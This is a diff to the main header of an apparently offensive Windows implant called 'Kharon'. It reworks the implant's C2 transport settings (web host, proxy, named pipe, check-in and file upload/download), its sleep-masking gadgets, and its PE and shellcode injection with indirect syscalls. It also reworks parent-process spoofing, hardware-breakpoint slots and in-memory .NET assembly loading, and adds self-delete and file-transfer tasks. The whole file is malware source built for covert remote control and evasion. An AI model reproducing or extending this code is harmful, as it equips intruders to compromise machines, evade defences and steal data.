@@ -3,13 +3,13 @@
 
 #include <windows.h>
 #include <ntstatus.h>
-#include <mscoree.h>
+#include <guiddef.h>
 
 namespace mscorlib {
-    #include <Clr.h>
+    #include <Mscoree.h>
 }
 
-#include <MetaHost.h>
+#include <Clr.h>
 
 #ifdef   WEB_WINHTTP
 #include <winhttp.h>
@@ -107,8 +107,9 @@ EXTERN_C UPTR EndPtr();
 #define PIPE_NAME ""
 #endif // PIPE_NAME
 
+class Dotnet;
 class Memory;
-class Obfuscate;
+class Mask;
 class Injection;
 class Package;
 class Parser;
@@ -117,13 +118,14 @@ class Thread;
 class Process;
 class Heap;
 class Library;
-class Communics;
+class Transport;
 class Token;
 
 namespace Root {
 
     class Kharon {    
     public:
+        Dotnet*    Dot;
         Library*   Lib;
         Token*     Tkn;
         Heap*      Hp;
@@ -131,8 +133,8 @@ namespace Root {
         Thread*    Td;
         Memory*    Mm;
         Task*      Tk;
-        Communics* Cmm;
-        Obfuscate* Obf;
+        Transport* Tsp;
+        Mask*      Mk;
         Injection* Inj;
         Parser*    Psr;
         Package*   Pkg;
@@ -189,101 +191,15 @@ namespace Root {
         };
 
         struct {
-            struct {
-                PWCHAR Host;
-                ULONG  Port;
-                PWCHAR EndPoint;
-                PWCHAR UserAgent;
-                PWCHAR HttpHeaders;
-                PWCHAR ProxyUrl;
-                PWCHAR ProxyUsername;
-                PWCHAR ProxyPassword;
-                BOOL   ProxyEnabled;
-                BOOL   Secure;
-            } Web;
-
-            struct {
-                struct {
-                    PCHAR FileID;
-                    ULONG ChunkSize;
-                    ULONG CurrentChunk;
-                    ULONG TotalChunks;
-                    PCHAR Path;
-               } Up;
-               
-               struct {
-
-               } Down;
-            } Tf;
-
-            struct {
-                PCHAR Name;
-            } Pipe;
-        } Transport = {
-            .Web = {
-                .Host         = WEB_HOST,
-                .Port         = WEB_PORT,
-                .EndPoint     = WEB_ENDPOINT,
-                .UserAgent    = WEB_USER_AGENT,
-                .HttpHeaders  = WEB_HTTP_HEADERS,
-                .ProxyUrl     = WEB_PROXY_URL,
-                .ProxyEnabled = WEB_PROXY_ENABLED,
-                .Secure       = WEB_SECURE_ENABLED
-            },
-            .Pipe = {
-                .Name = PIPE_NAME
-            }
-        };
+            UPTR Dr0;
+            UPTR Dr1;
+            UPTR Dr2;
+            UPTR Dr3;
+        } Hwbp;
 
         struct {
-            UPTR  NtContinueGadget;
-            UPTR  JmpGadget;
-            UINT8 TechniqueID;
-            BOOL  Heap;
-        } Mask = {
-            .TechniqueID = KH_SLEEP_MASK,
-            .Heap        = KH_HEAP_MASK
-        };
 
-        struct {
-            struct {
-                UINT8 TechniqueID;
-            } PE;
-
-            struct {
-                UINT8 TechniqueID;
-            } Sc; 
-
-            struct {
-                BOOL  Boolean;
-                ULONG Length;
-                PCHAR Name;
-            } Pipe;
-
-            struct {
-                ULONG Length;
-                PBYTE Buffer;
-            } Param;
-            
-            BOOL  Spawn;
-            BOOL  Syscall;
-        } InjCtx = {
-            .PE = { .TechniqueID = KH_INJECTION_PE },
-            .Sc = { .TechniqueID = KH_INJECTION_SC },
-            .Syscall = KH_INDIRECT_SYSCALL_ENABLED
-        };
-        
-        struct {
-            ULONG ParentID;
-            BOOL  BlockDlls;
-            PCHAR CurrentDir;
-            BOOL  Pipe;
-        } PsCtx = {
-            .ParentID   = 0,
-            .BlockDlls  = FALSE,
-            .CurrentDir = 0,
-            .Pipe       = TRUE
-        };
+        } SpoofCtx = {};
 
         struct {
             UPTR Handle;
@@ -295,6 +211,10 @@ namespace Root {
             DECLAPI( DuplicateHandle );
             DECLAPI( SetHandleInformation );
             DECLAPI( GetStdHandle );
+            DECLAPI( SetStdHandle );
+
+            DECLAPI( GetConsoleWindow );
+            DECLAPI( AllocConsole );
 
             DECLAPI( CreateFileA );
             DECLAPI( CreateFileW );
@@ -358,6 +278,10 @@ namespace Root {
             RSL_TYPE( DuplicateHandle ),
             RSL_TYPE( SetHandleInformation ),
             RSL_TYPE( GetStdHandle ),
+            RSL_TYPE( SetStdHandle ),
+
+            RSL_TYPE( GetConsoleWindow ),
+            RSL_TYPE( AllocConsole ),
         
             RSL_TYPE( CreateFileA ),
             RSL_TYPE( CreateFileW ),
@@ -508,7 +432,39 @@ namespace Root {
             RSL_TYPE( RtlCreateTimerQueue ),
             RSL_TYPE( RtlDeleteTimerQueue ),
         };
-                
+           
+        struct {
+            UPTR Handle;
+
+            DECLAPI( CommandLineToArgvW );
+        } Shell32 = {
+            RSL_TYPE( CommandLineToArgvW ),
+        };
+
+        struct {
+            UPTR Handle;
+
+            DECLAPI( ShowWindow );
+        } User32 = {
+            RSL_TYPE( ShowWindow ),
+        };
+
+        struct {
+            UPTR Handle;
+
+            DECLAPI( SafeArrayCreateVector );
+            DECLAPI( SafeArrayCreate );
+            DECLAPI( SysAllocString );
+            DECLAPI( SafeArrayPutElement );
+            DECLAPI( SafeArrayDestroy );
+        } Oleaut32 = {
+            RSL_TYPE( SafeArrayCreateVector ),
+            RSL_TYPE( SafeArrayCreate ),
+            RSL_TYPE( SysAllocString ),
+            RSL_TYPE( SafeArrayPutElement ),
+            RSL_TYPE( SafeArrayDestroy ),
+        };
+
         struct {
             UPTR Handle;
             DECLAPI( LookupAccountSidW );
@@ -535,11 +491,21 @@ namespace Root {
         };
 
         struct {
+            UPTR Handle;
+
             DECLAPI( SystemFunction040 );
             DECLAPI( SystemFunction041 );
         } Cryptbase = {
             RSL_TYPE( SystemFunction040 ),
             RSL_TYPE( SystemFunction041 ),
+        };
+
+        struct {
+            UPTR Handle;
+
+            DECLAPI( CLRCreateInstance );
+        } Mscoree = {
+            RSL_TYPE( CLRCreateInstance ),
         };
 
         struct {
@@ -578,20 +544,61 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
+        VOID InitDotnet( Dotnet* DotnetRf ) { Dot = DotnetRf; }
         VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
         VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
         VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
         VOID InitThread( Thread* ThreadRf ) { Td = ThreadRf; }
         VOID InitProcess( Process* ProcessRf ) { Ps = ProcessRf; }
         VOID InitTask( Task* TaskRf ) { Tk = TaskRf; }
-        VOID InitCommunics( Communics* CommunicsRf ) { Cmm = CommunicsRf; }
+        VOID InitTransport( Transport* TransportRf ) { Tsp = TransportRf; }
         VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
         VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
-        VOID InitObfuscate( Obfuscate* ObfuscateRf ) { Obf = ObfuscateRf; }
+        VOID InitMask( Mask* MaskRf ) { Mk = MaskRf; }
         VOID InitInjection( Injection* InjectionRf ) { Inj = InjectionRf; }
         VOID InitMemory( Memory* MemoryRf ) { Mm = MemoryRf; }
     };
 }
+
+class Dotnet {
+private:
+    Root::Kharon* Kh;
+public:
+    Dotnet( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+
+    struct {
+        GUID xCLSID_CLRMetaHost;
+        GUID xCLSID_CorRuntimeHost;
+        GUID xIID_AppDomain;
+        GUID xIID_ICLRMetaHost;
+        GUID xIID_ICLRRuntimeInfo;
+        GUID xIID_ICorRuntimeHost;
+    } GUID = {
+        .xCLSID_CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
+        .xCLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
+        .xIID_AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
+        .xIID_ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
+        .xIID_ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
+        .xIID_ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
+    };
+
+    struct {
+        PWCHAR w; // pointer
+        ULONG  s; // size
+        PCHAR  a;
+    } Buffer;
+
+    BOOL KeepLoad;
+
+    auto Inline(
+        _In_ PBYTE AsmBytes,
+        _In_ ULONG AsmLength,
+        _In_ PWSTR Arguments,
+        _In_ PWSTR AppDomName,
+        _In_ PWSTR Version,
+        _In_ BOOL  KeepLoad
+    ) -> BOOL;
+};
 
 class Resolve {
 private:
@@ -682,7 +689,7 @@ public:
     auto Transmit( 
         _In_  PPACKAGE Package, 
         _Out_ PVOID*   Response, 
-        _Out_ PSIZE_T  Size 
+        _Out_ PUINT64  Size 
     ) -> BOOL;
 
     auto Error(
@@ -709,13 +716,13 @@ public:
     auto NewTask( 
         _In_ PPARSER parser, 
         _In_ PVOID   Buffer, 
-        _In_ UINT32  size 
+        _In_ UINT64  size 
     ) -> VOID;
 
     auto New( 
         _In_ PPARSER parser, 
         _In_ PVOID   Buffer, 
-        _In_ UINT32  size 
+        _In_ UINT64  size 
     ) -> VOID;
 
     auto Pad(
@@ -759,11 +766,53 @@ public:
     ) -> BOOL;   
 };
 
-class Communics {    
+class Transport {    
 private:
     Root::Kharon* Kh;
 public:
-    Communics( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Transport( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+
+    struct {
+        PWCHAR Host;
+        ULONG  Port;
+        PWCHAR EndPoint;
+        PWCHAR UserAgent;
+        PWCHAR HttpHeaders;
+        PWCHAR ProxyUrl;
+        PWCHAR ProxyUsername;
+        PWCHAR ProxyPassword;
+        BOOL   ProxyEnabled;
+        BOOL   Secure;
+    } Web = {
+        .Host         = WEB_HOST,
+        .Port         = WEB_PORT,
+        .EndPoint     = WEB_ENDPOINT,
+        .UserAgent    = WEB_USER_AGENT,
+        .HttpHeaders  = WEB_HTTP_HEADERS,
+        .ProxyUrl     = WEB_PROXY_URL,
+        .ProxyEnabled = WEB_PROXY_ENABLED,
+        .Secure       = WEB_SECURE_ENABLED
+    };
+
+    struct {
+        struct {
+            PCHAR FileID;
+            ULONG ChunkSize;
+            ULONG CurrentChunk;
+            ULONG TotalChunks;
+            PCHAR Path;
+        } Up;
+        
+        struct {
+
+        } Down;
+    } Tf;
+
+    struct {
+        PCHAR Name;
+    } Pipe = {
+        .Name = PIPE_NAME
+    };
 
     auto Checkin(
         VOID
@@ -838,15 +887,19 @@ public:
     typedef auto ( Task::*TASK_FUNC )( PPARSER ) -> ERROR_CODE;
 
     struct {
-        ULONG         ID;
+        ULONG        ID;
         ERROR_CODE ( Task::*Run )( PPARSER );
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID = TkExit,       Mgmt[0].Run = &Task::Exit,
         Mgmt[1].ID = TkFileSystem, Mgmt[1].Run = &Task::FileSystem,
         Mgmt[2].ID = TkProcess,    Mgmt[2].Run = &Task::Process,
-        Mgmt[3].ID = TkGetInfo,    Mgmt[5].Run = &Task::GetInfo,
-        Mgmt[4].ID = TkSelfDelete, Mgmt[6].Run = &Task::SelfDelete,
-        Mgmt[5].ID = TkInjection,  Mgmt[7].Run = &Task::Injection,
+        Mgmt[3].ID = TkGetInfo,    Mgmt[3].Run = &Task::GetInfo,
+        Mgmt[4].ID = TkSelfDelete, Mgmt[4].Run = &Task::SelfDelete,
+        Mgmt[5].ID = TkInjection,  Mgmt[5].Run = &Task::Injection,
+        Mgmt[6].ID = TkConfig,     Mgmt[6].Run = &Task::Config,
+        Mgmt[7].ID = TkDownload,   Mgmt[7].Run = &Task::Download,
+        Mgmt[8].ID = TkUpload,     Mgmt[8].Run = &Task::Upload,
+        Mgmt[9].ID = TkDotnet,     Mgmt[9].Run = &Task::Dotnet,
     };
 };
 
@@ -855,6 +908,18 @@ private:
     Root::Kharon* Kh;
 public:
     Process( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    
+    struct {
+        ULONG ParentID;
+        BOOL  BlockDlls;
+        PCHAR CurrentDir;
+        BOOL  Pipe;
+    } Ctx = {
+        .ParentID   = 0,
+        .BlockDlls  = FALSE,
+        .CurrentDir = 0,
+        .Pipe       = TRUE
+    };
 
     auto Open(
         _In_ ULONG RightsAccess,
@@ -984,11 +1049,21 @@ public:
     ) -> BOOL;
 };
 
-class Obfuscate {
+class Mask {
 private:
     Root::Kharon* Kh;
 public:
-    Obfuscate( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Mask( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+
+    struct {
+        UPTR  NtContinueGadget;
+        UPTR  JmpGadget;
+        UINT8 TechniqueID;
+        BOOL  Heap;
+    } Ctx = {
+        .TechniqueID = KH_SLEEP_MASK,
+        .Heap        = KH_HEAP_MASK
+    };
 
     auto FindGadget(
         _In_ UPTR   ModuleBase,
@@ -1016,6 +1091,36 @@ class Injection {
 private:
     Root::Kharon* Kh;
 public:
+
+    struct {
+        struct {
+            UINT8 TechniqueID;
+        } PE;
+
+        struct {
+            UINT8 TechniqueID;
+        } Sc; 
+
+        struct {
+            BOOL  Boolean;
+            ULONG Length;
+            PCHAR Name;
+        } Pipe;
+
+        struct {
+            ULONG Length;
+            PBYTE Buffer;
+        } Param;
+        
+        BOOL  Spawn;
+        BOOL  Syscall;
+
+    } Ctx = {
+        .PE = { .TechniqueID = KH_INJECTION_PE },
+        .Sc = { .TechniqueID = KH_INJECTION_SC },
+        .Syscall = KH_INDIRECT_SYSCALL_ENABLED
+    };
+
     Injection( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
 
     auto Classic(
@@ -1046,10 +1151,11 @@ public:
     auto DECLFN Initialize(
         _In_ UINT8 UpdateCount
     ) -> BOOL {
+        INT3BRK
         Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
-
         AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, AttrSize );
-        return Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
+
+        return Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
     }
 
     auto DECLFN UpdateParentSpf(
